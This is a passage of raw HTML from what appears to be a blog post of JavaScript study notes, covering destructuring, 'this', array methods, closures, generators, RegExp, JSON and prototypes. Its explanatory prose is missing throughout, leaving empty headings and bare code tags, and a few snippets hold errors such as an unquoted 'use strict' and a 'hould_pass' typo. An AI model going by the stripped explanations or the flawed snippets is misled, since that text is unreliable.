class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">    name : <span class=\"string\">'xiaoming'</span>,</span><br><span class=\"line\">\t\tage : <span class=\"number\">18</span>,</span><br><span class=\"line\">\t\tuniversity : &#123;</span><br><span class=\"line\">\t\t\t\tspecialities : <span class=\"string\">'cs'</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> &#123;name,age&#125; = person;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> &#123;<span class=\"attr\">university</span> : &#123;specialities&#125;&#125; = person;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> &#123;<span class=\"attr\">name</span>:mz&#125; = person;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>x</code><code>y</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var x &#x3D; 1,y &#x3D; 2;</span><br><span class=\"line\">[x , y] &#x3D; [y ,x];</span><br></pre></td></tr></table></figure>\n<p></p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p><code>this</code><code>xiaoming</code><code>this.birth</code><code>xiaoming</code><code>birth</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getAge</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> y = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getFullYear();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y - <span class=\"keyword\">this</span>.birth;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">''</span>,</span><br><span class=\"line\">    birth: <span class=\"number\">1990</span>,</span><br><span class=\"line\">    age: getAge</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">xiaoming.age(); <span class=\"comment\">// 30, </span></span><br><span class=\"line\">getAge(); <span class=\"comment\">// NaN</span></span><br></pre></td></tr></table></figure>\n<p><code>xiaoming.age()</code><code>this</code><code>xiaoming</code></p>\n<p><code>getAge()</code><code>this</code><code>window</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use strict;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = &#123;</span><br><span class=\"line\">\tname : <span class=\"string\">'xiaoming'</span>,</span><br><span class=\"line\">\tage : <span class=\"number\">18</span>,</span><br><span class=\"line\">\tmath : <span class=\"number\">90</span>,</span><br><span class=\"line\">\ten : <span class=\"number\">99</span>,</span><br><span class=\"line\">\tgrades : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> that = <span class=\"keyword\">this</span>;  <span class=\"comment\">//this</span></span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getGrades</span>(<span class=\"params\"></span>)</span>&#123;  <span class=\"comment\">//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> that.math+that.en;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> getGrades();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h3><p><code>map()</code>JavaScript<code>Array</code><code>Array</code><code>map()</code><code>Array</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\">arr.map(<span class=\"function\"><span class=\"params\">x</span>=&gt;</span>x*<span class=\"number\">2</span>); <span class=\"comment\">//[2,4,6]</span></span><br><span class=\"line\">arr.map(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">x</span>)</span>&#123;<span class=\"keyword\">return</span> x*<span class=\"number\">2</span>;&#125;); <span class=\"comment\">//[2,4,6]</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"reduce\"><a href=\"#reduce\" class=\"headerlink\" title=\"reduce\"></a>reduce</h3><p>rray<code>reduce()</code><code>Array</code><code>[x1, x2, x3...]</code><code>reduce()</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [x1,x2,x3,x4];</span><br><span class=\"line\">arr.reduce(<span class=\"function\">(<span class=\"params\">x,y</span>)=&gt;</span>(x+y)); <span class=\"comment\">//x1+x2+x3+x4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * <span class=\"number\">10</span> + y;</span><br><span class=\"line\">&#125;); <span class=\"comment\">// 13579</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a><strong>filter</strong></h3><p>filter<code>Array</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x%<span class=\"number\">2</span> !=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(r);</span><br></pre></td></tr></table></figure>\n<h3 id=\"sort\"><a href=\"#sort\" class=\"headerlink\" title=\"sort\"></a>sort</h3><p>jsStringascii</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr &#x3D; [10,20,1,2];</span><br><span class=\"line\">var r &#x3D; arr.sort(function(x,y)&#123;</span><br><span class=\"line\">\tif(x&lt;y)return 1;</span><br><span class=\"line\">\telse if(x&gt;y)return -1;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">console.log(arr) &#x2F;&#x2F;[20,10,2,1]</span><br><span class=\"line\">console.log(r)  &#x2F;&#x2F;[20,10,2,1]</span><br></pre></td></tr></table></figure>\n<p><code>sort()</code><code>Array</code><code>Array</code></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">lazy_sum</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sum = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arr.reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> f = lazy_sum([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]);</span><br><span class=\"line\">f;   <span class=\"comment\">//fsum</span></span><br><span class=\"line\">f();  <span class=\"comment\">//f()</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//&#123;&#125;</span></span><br><span class=\"line\">x =&gt; x*x</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x*x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">x =&gt; &#123;</span><br><span class=\"line\">\t... return ;</span><br><span class=\"line\">\t... return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">(x,y) =&gt; x*x+y*y</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">x =&gt; (&#123;<span class=\"attr\">foo</span>:x&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"generator\"><a href=\"#generator\" class=\"headerlink\" title=\"generator\"></a>generator</h2><p>generator<code>function*</code><code>*</code><code>return</code><code>yield</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function* foo(x)&#123;</span><br><span class=\"line\">  yield x+1;</span><br><span class=\"line\">  yield x+2;</span><br><span class=\"line\">  return x+3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(2);</span><br></pre></td></tr></table></figure>\n<p>generator</p>\n<ul>\n<li><p>generator<code>next()</code><code>next()</code>generator<code>yield x;</code><code>{value: x, done: true/false}</code><code>value</code><code>yield</code><code>done</code>generator<code>done</code><code>true</code><code>value</code><code>return</code></p>\n</li>\n<li><p><code>for ... of</code>generator<code>done</code></p>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = foo(<span class=\"number\">2</span>);</span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: 3, done: false&#125;</span></span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: 4, done: false&#125;</span></span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: 5, done: true&#125;</span></span><br><span class=\"line\">f.next()\t<span class=\"comment\">//&#123;value: undefined, done: true&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> x <span class=\"keyword\">of</span> foo(<span class=\"number\">2</span>))&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(x);</span><br><span class=\"line\">&#125;  <span class=\"comment\">//3,4</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><ul>\n<li><code>new Number()</code><code>new Boolean()</code><code>new String()</code></li>\n<li><code>parseInt()</code><code>parseFloat()</code><code>number</code></li>\n<li><code>String()</code><code>string</code><code>toString()</code></li>\n<li><code>boolean</code><code>if (myVar) {...}</code></li>\n<li><code>typeof</code><code>number</code><code>boolean</code><code>string</code><code>function</code><code>undefined</code></li>\n<li><code>Array</code><code>Array.isArray(arr)</code></li>\n<li><code>null</code><code>myVar === null</code></li>\n<li><code>typeof window.myVar === &#39;undefined&#39;</code></li>\n<li><code>typeof myVar === &#39;undefined&#39;</code></li>\n</ul>\n<h2 id=\"Date\"><a href=\"#Date\" class=\"headerlink\" title=\"Date\"></a>Date</h2><p>JavaScript<code>Date</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var now &#x3D; new Date();</span><br><span class=\"line\">now.getMilliseconds();  &#x2F;&#x2F;</span><br><span class=\"line\">now.getTime();  &#x2F;&#x2F;</span><br><span class=\"line\">var d &#x3D; new Date(2020,6,30,8,39,30,123)  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"RegExp\"><a href=\"#RegExp\" class=\"headerlink\" title=\"RegExp\"></a>RegExp</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p><code>\\d</code></p>\n<p><code>\\w</code></p>\n<p><code>.</code></p>\n<p><code>*</code></p>\n<p><code>+</code></p>\n<p><code>?</code>01</p>\n<p><code>{n}</code>n</p>\n<p><code>{n,m}</code>n-m</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p><code>[]</code></p>\n<ul>\n<li><code>[0-9a-zA-Z\\_]</code></li>\n<li><code>[0-9a-zA-Z\\_]+</code><code>&#39;a100&#39;</code><code>&#39;0_Z&#39;</code><code>&#39;js2015&#39;</code></li>\n<li><code>[a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]*</code> d dJavaScript</li>\n<li><code>[a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]{0, 19}</code>1-201+19</li>\n</ul>\n<p><code>A|B</code>AB</p>\n<p><code>^</code><code>^\\d</code></p>\n<p><code>$</code><code>\\d$</code></p>\n<h3 id=\"js\"><a href=\"#js\" class=\"headerlink\" title=\"js\"></a><strong>js</strong></h3><p>JavaScript</p>\n<p><code>//</code><code>new RegExp(&#39;&#39;)</code>RegExp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">var re1 &#x3D; &#x2F;ABC&#x2F;;</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">var re2 &#x3D; new RegExp(&#39;ABC&#39;);</span><br></pre></td></tr></table></figure>\n<p>RegExp<code>test()</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re2.test(&#39;ABC&#39;);  &#x2F;&#x2F;true</span><br><span class=\"line\">re2.test(&#39;abc&#39;);  &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a b   c'</span>.split(<span class=\"string\">' '</span>); <span class=\"comment\">// ['a', 'b', '', '', 'c']</span></span><br><span class=\"line\"><span class=\"string\">'a b   c'</span>.split(<span class=\"regexp\">/\\s+/</span>); <span class=\"comment\">// ['a', 'b', 'c']</span></span><br><span class=\"line\"><span class=\"string\">'a,b, c  d'</span>.split(<span class=\"regexp\">/[\\s\\,]+/</span>); <span class=\"comment\">// ['a', 'b', 'c', 'd']</span></span><br><span class=\"line\"><span class=\"string\">'a,b;; c  d'</span>.split(<span class=\"regexp\">/[\\s\\,\\;]+/</span>); <span class=\"comment\">// ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p><code>()</code>Group</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"regexp\">/^(\\d&#123;3&#125;)-(\\d&#123;3,8&#125;)$/</span>;</span><br><span class=\"line\">re.exec(<span class=\"string\">'010-12345'</span>); <span class=\"comment\">// ['010-12345', '010', '12345']</span></span><br><span class=\"line\">re.exec(<span class=\"string\">'010 12345'</span>); <span class=\"comment\">// null</span></span><br></pre></td></tr></table></figure>\n<p><code>RegExp</code><code>exec()</code></p>\n<p><code>exec()</code><code>Array</code></p>\n<p><code>exec()</code><code>null</code></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"*\"></a><strong>*</strong></h3><p><code>0</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var re &#x3D; &#x2F;^(\\d+)(0*)$&#x2F;;</span><br><span class=\"line\">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;]</span><br></pre></td></tr></table></figure>\n<p><code>\\d+</code><code>0</code><code>0*</code></p>\n<p><code>\\d+</code><code>0</code><code>?</code><code>\\d+</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var re &#x3D; &#x2F;^(\\d+?)(0*)$&#x2F;;</span><br><span class=\"line\">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;]</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p>JavaScript<code>g</code><code>i</code><code>m</code></p>\n<p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Email</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"regexp\">/^[0-9a-zA-Z\\.]+\\@[0-9a-zA-Z]+\\.(com|org)$/</span>;</span><br><span class=\"line\">hould_pass = [<span class=\"string\">'someone@gmail.com'</span>, <span class=\"string\">'bill.gates@microsoft.com'</span>, <span class=\"string\">'tom@voyager.org'</span>, <span class=\"string\">'bob2015@163.com'</span>],</span><br><span class=\"line\">    should_fail = [<span class=\"string\">'test#gmail.com'</span>, <span class=\"string\">'bill@microsoft'</span>, <span class=\"string\">'bill%gates@ms.com'</span>, <span class=\"string\">'@voyager.org'</span>];</span><br><span class=\"line\"><span class=\"comment\">//Email</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"regexp\">/^\\&lt;(\\w+\\s+\\w+)\\&gt; (\\w+\\.*\\@\\w+\\.+\\w+)$/</span>;</span><br><span class=\"line\">shoule_pass = <span class=\"string\">'&lt;Tom Paris&gt; tom@voyager.org'</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\\s ,\\w,\\d</li>\n<li>i</li>\n</ul>\n<h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><ul>\n<li>numberJavaScript<code>number</code></li>\n<li>booleanJavaScript<code>true</code><code>false</code></li>\n<li>stringJavaScript<code>string</code></li>\n<li>nullJavaScript<code>null</code></li>\n<li>arrayJavaScript<code>Array</code><code>[]</code></li>\n<li>objectJavaScript<code>{ ... }</code></li>\n</ul>\n<p>JSON<code>&quot;&quot;</code>Object<code>&quot;&quot;</code></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = &#123;</span><br><span class=\"line\">\t\tname: <span class=\"string\">'xiaoming'</span>,</span><br><span class=\"line\">\t\tage: <span class=\"number\">14</span>,</span><br><span class=\"line\">\t\theight: <span class=\"number\">165</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"built_in\">JSON</span>.stringify(xiaoming);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s); <span class=\"comment\">//&#123;\"name\":\"xiaoming\",\"age\":14,\"height\":165&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"built_in\">JSON</span>.stringify(xiaoming,<span class=\"literal\">null</span>,<span class=\"string\">' '</span>); </span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s); <span class=\"comment\">//\"&#123;</span></span><br><span class=\"line\"> <span class=\"string\">\"name\"</span>: <span class=\"string\">\"xiaoming\"</span>,</span><br><span class=\"line\"> <span class=\"string\">\"age\"</span>: <span class=\"number\">14</span>,</span><br><span class=\"line\"> <span class=\"string\">\"height\"</span>: <span class=\"number\">165</span></span><br><span class=\"line\">&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">//stringify(a,b,c)</span></span><br><span class=\"line\"><span class=\"string\">//ab['age','name'],c' '</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>JSON<code>JSON.parse()</code>JavaScript</p>\n<p><code>JSON.parse()</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">JSON</span>.parse(<span class=\"string\">'&#123;\"name\":\"\",\"age\":14&#125;'</span>); <span class=\"comment\">// Object &#123;name: '', age: 14&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"built_in\">JSON</span>.parse(<span class=\"string\">'&#123;\"name\":\"\",\"age\":14&#125;'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">key,value</span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (key ===<span class=\"string\">'name'</span>)&#123;<span class=\"keyword\">return</span> value + <span class=\"string\">''</span>&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>js</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; :</span><br><span class=\"line\">var Student &#x3D; &#123;</span><br><span class=\"line\">    name: &#39;Robot&#39;,</span><br><span class=\"line\">    height: 1.2,</span><br><span class=\"line\">    run: function () &#123;</span><br><span class=\"line\">        console.log(this.name + &#39; is running...&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">function createStudent(name) &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; Student:</span><br><span class=\"line\">    var s &#x3D; Object.create(Student);</span><br><span class=\"line\">    &#x2F;&#x2F; :</span><br><span class=\"line\">    s.name &#x3D; name;</span><br><span class=\"line\">    return s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var xiaoming &#x3D; createStudent(&#39;&#39;);</span><br><span class=\"line\">xiaoming.run(); &#x2F;&#x2F;  is running...</span><br><span class=\"line\">xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>JavaScript</p>\n<p><code>obj.xxx</code>JavaScript<code>Object.prototype</code><code>undefined</code></p>\n<p><strong></strong></p>\n<p><code>{ ... }</code>JavaScript</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Student(name) &#123;</span><br><span class=\"line\">    this.name &#x3D; name;</span><br><span class=\"line\">    this.hello &#x3D; function () &#123;</span><br><span class=\"line\">        alert(&#39;Hello, &#39; + this.name + &#39;!&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var xiaoming &#x3D; new Student(&#39;xiaoming&#39;)</span><br></pre></td></tr></table></figure>\n<p><code>new</code><code>this</code><code>this</code><code>return this;</code></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730195400823.png\" alt=\"image-20200730195400823\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span 